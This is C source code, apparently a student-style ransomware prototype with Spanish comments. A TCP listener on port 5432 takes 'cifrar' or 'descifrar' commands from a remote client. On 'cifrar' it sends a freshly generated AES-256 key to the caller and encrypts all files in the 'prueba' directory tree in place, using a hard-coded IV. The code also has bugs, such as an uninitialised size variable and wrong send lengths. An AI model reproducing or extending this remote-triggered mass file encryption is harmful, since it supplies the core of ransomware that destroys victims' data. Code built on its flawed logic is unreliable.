#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <openssl/aes.h>
#include <unistd.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dirent.h>
#include <openssl/evp.h>
#include <math.h>

#define PORT 5432 // puerto de conexion
void cifrado(char *archivo,int cifrar);
void cifrado2(char *archivo,int cifrar);
void abrirDirectorio(char *directorio,int cifra);
void generarllave();
unsigned char llave[32];
unsigned char* iv="abcde67890123456";
char llaveXOR;

int main(void) {
  int sockfd, new_sockfd;  // descriptores de archivo
  struct sockaddr_in host_addr, client_addr;  // Informacion de las direcciones IP
  socklen_t sin_size;
  int recv_length=1, yes=1;
  char buffer[1024];

  if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
    perror("Error al crear el socket");

  if (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1)
    perror("Error al agregar la opcion SO_REUSEADDR en setsockopt");
  
  host_addr.sin_family = AF_INET;    // 
  host_addr.sin_port = htons(PORT);  //
  host_addr.sin_addr.s_addr = INADDR_ANY; // Asigno mi IPP
  memset(&(host_addr.sin_zero), '\0', 8); // El resto de la estructura en 0s

  if (bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr)) == -1)
    perror("Error haciendo el bind");

  if (listen(sockfd, 5) == -1)
    perror("Error al escuchar en el socket");
  generarllave();
  while(1) {    // Accept loop
    sin_size = sizeof(struct sockaddr_in);
    new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
    if(new_sockfd == -1)
      perror("Error al aceptar la conexion");
    printf("server: Conexion aceptada desde %s desde  %d\n",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
    send(new_sockfd, ":v\n", 13, 0);
    recv_length = recv(new_sockfd, &buffer, 1024, 0);
    while(recv_length > 0) {
      printf("RECV: %d bytes\n", recv_length);
      printf("Recibiendo: %s\n",buffer);
      if (strncmp(buffer,"cifrar",6)==0){
        send(new_sockfd, "\nllave: ", 11, 0);
        send(new_sockfd, &llave, sizeof(llave), 0);
        send(new_sockfd, "\n: ", 1, 0);
        // printf("llaveXOR: %c\n", llaveXOR);
        abrirDirectorio("prueba",1);
      }else if(strncmp(buffer,"descifrar",9)==0){
        abrirDirectorio("prueba",0);
      }
      recv_length = recv(new_sockfd, &buffer, 1024, 0);
    }
    close(new_sockfd);
  }
  return 0;
}
void generarllave(){
  int fdrandom; //Declaracion de un descriptor de archivos.
  char *archivo="/dev/random"; // archivo que genera aleaotreamente
  fdrandom=open(archivo,O_RDONLY);// Se abre como solo lectura
  int num;
  // read regresa el numero de bits que leyo
  for (int i = 0; i < 32;i++){
    if(read(fdrandom,&num,sizeof(int))!=0){
      llave[i]= (unsigned char) abs(num%25) + 65;
    }
  }
  if(read(fdrandom,&num,sizeof(int))!=0) llaveXOR= (char) abs(num%25) + 65;
  // printf("\nmillave: %s\n", buffer);
  if(close(fdrandom)==-1) //debe cerrar.
    exit(1);
}
void abrirDirectorio(char *directorio,int cifra){
  // Abrimos el directorio actual
  DIR *d = opendir(directorio); //
  struct dirent *dentry;
  //mientras podamos leer los archivos dentro del directorio actual ejecutara el codigo
  while((dentry=readdir(d))!=NULL){
  //    printf("%s\n",dentry->d_name); //Imprime los archivos dentro del directorio
  // Validamos que no abra los archivos de . y ..
    if(strcmp(dentry->d_name,".")!=0 && strcmp(dentry->d_name,"..")!=0 ){
      // generamos un variable para guardar la ruta. Esto para poder cifrar los archivos que esten dentro de otro directorio.
      char *ruta=(char *) calloc(sizeof(char),512);
      //copiamos la ruta
       strcpy(ruta, directorio ); //ruta=./prueba/
      // le agregamos (concatenamos) el nombre del archivo
      strcat(ruta, "/" ); // ruta = ./prueba/
      strcat(ruta, dentry->d_name ); // ruta = ./prueba/nombre_archivo
      //printf("%s\n",dentry->d_name);
      //Mandamos a llamar la funcion cifrar
      cifrado2(ruta,cifra);
    }
  }
}
void cifrado(char * archivo,int cifrar)
{
  int fd,totalPalabra=0,fdw;
  char palabra;
  // abrimos el archivo en modo de lectura y escrituta.
  fd=open(archivo,O_RDONLY);
  if(fd!=-1){
    //usamos stat para saber el tamaño del archivo
    struct stat fileStat;
    if(fstat(fd,&fileStat) < 0)    
      exit(1);
    if (S_ISDIR(fileStat.st_mode)) {
      abrirDirectorio(archivo,1);
    }else{
      if (fileStat.st_size>0){
        close(fd);
        // fd=open(archivo,O_RDWR);
          // lseek(fd,-1,SEEK_CUR);
        //se usa EVP para cifrar
        FILE * fo=fopen(archivo,"r+b");
        int tama_salida,final;
        int bytes_read;
        fseek( fo, 0, SEEK_END );
        final = ftell( fo );
        fseek( fo, 0, SEEK_SET );
        unsigned tamano_buf;
        if(cifrar) tamano_buf = 16;
        else tamano_buf = 16;
        unsigned char* leer_buf = malloc(tamano_buf);
        unsigned char* cifrado_buf;
        unsigned bloque;

        EVP_CIPHER_CTX ctx;

        EVP_CipherInit(&ctx,EVP_aes_256_cbc(),llave,iv,cifrar);
        bloque = EVP_CIPHER_CTX_block_size(&ctx);
        cifrado_buf = malloc(tamano_buf+bloque);

          printf("-------------------------------------\n");
          printf("cifrar: %i\n", cifrar);
          printf("archivo: %s\n", archivo);
          printf("tamaño final: %i\n", final);
          printf("tamaño: %i\n", fileStat.st_size);
        // read file and write encrypted file until eof
        while(1)
        {
          bytes_read = fread(leer_buf,sizeof(unsigned char),tamano_buf,fo);
          printf("tamaño bytes_read: %i\n", bytes_read);
          printf("%s\n", leer_buf);
          fseek( fo, -1*bytes_read, SEEK_CUR );
          if(bytes_read == tamano_buf){
            EVP_CipherUpdate(&ctx,cifrado_buf,&tama_salida,leer_buf, bytes_read);
            printf("cifrado: %s\n", cifrado_buf);
            printf("tama_salida: %i\n", tama_salida);
            if(tama_salida>0) fwrite(cifrado_buf,sizeof(unsigned char),tama_salida,fo);
            if( (final-tama_salida)==0 && cifrar==0 ) break;

          }else{//si lo que lee es menos que el tamaño permitido
            EVP_CipherFinal(&ctx,cifrado_buf,&tama_salida);
            printf("*tama_salida: %i\n", tama_salida);
            fwrite(cifrado_buf,sizeof(unsigned char),tama_salida,fo);
            // fwrite(cifrado_buf,sizeof(unsigned char),tama_salida,fo);
            break;
          }
        }
        printf("-------------------------------------\n");
        
        // fseek( fo, -1*bytes_read, SEEK_CUR );
        fclose(fo);
      }
    }
  }
  //La llave para cifrar
  close(fd);
}
void cifrado2(char * archivo,int cifrar)
{
  int fd,totalPalabra=0,fdw;
  char palabra;
  // abrimos el archivo en modo de lectura y escrituta.
  fd=open(archivo,O_RDONLY);
  if(fd!=-1){
    //usamos stat para saber el tamaño del archivo
    struct stat fileStat;
    if(fstat(fd,&fileStat) < 0)    
      exit(1);
    if (S_ISDIR(fileStat.st_mode)) {
      abrirDirectorio(archivo,1);
    }else{
      if (fileStat.st_size>0){
        close(fd);
        // fd=open(archivo,O_RDWR);
          // lseek(fd,-1,SEEK_CUR);
        //se usa EVP para cifrar
        fd=open(archivo,O_RDWR);
        int tama_salida,final;
        int bytes_read;
        // lseek( fd, 0, SEEK_END );
        // final = ftell( fd );
        // fseek( fd, 0, SEEK_SET );
        unsigned tamano_buf;
        if(cifrar) tamano_buf = 16;
        else tamano_buf = 16;
        unsigned char* leer_buf = malloc(tamano_buf);
        unsigned char* cifrado_buf;
        unsigned bloque;

        EVP_CIPHER_CTX ctx;

        EVP_CipherInit(&ctx,EVP_aes_256_cbc(),llave,iv,cifrar);
        bloque = EVP_CIPHER_CTX_block_size(&ctx);
        cifrado_buf = malloc(tamano_buf+bloque);

          printf("-------------------------------------\n");
          printf("cifrar: %i\n", cifrar);
          printf("archivo: %s\n", archivo);
          // printf("tamaño final: %i\n", final);
          printf("tamaño: %i\n", fileStat.st_size);
        // read file and write encrypted file until eof
        while(1)
        {
          bytes_read = read(fd,leer_buf,sizeof(unsigned char)*tamano_buf);
          printf("tamaño bytes_read: %i\n", bytes_read);
          printf("%s\n", leer_buf);
          lseek( fd, -1*bytes_read, SEEK_CUR );
          if(bytes_read == tamano_buf){
            EVP_CipherUpdate(&ctx,cifrado_buf,&tama_salida,leer_buf, bytes_read);
            printf("cifrado: %s\n", cifrado_buf);
            printf("tama_salida: %i\n", tama_salida);
            if(tama_salida>0) write(fd,cifrado_buf,sizeof(unsigned char)*tama_salida);
            if( (final-tama_salida)==0 && cifrar==0 ) break;

          }else{//si lo que lee es menos que el tamaño permitido
            EVP_CipherFinal(&ctx,cifrado_buf,&tama_salida);
            printf("*tama_salida: %i\n", tama_salida);
            write(fd,cifrado_buf,sizeof(unsigned char)*tama_salida);
            // fwrite(cifrado_buf,sizeof(unsigned char),tama_salida,fo);
            break;
          }
        }
        printf("-------------------------------------\n");
        
        // fseek( fo, -1*bytes_read, SEEK_CUR );
        close(fd);
      }
    }
  }
  //La llave para cifrar
  close(fd);
}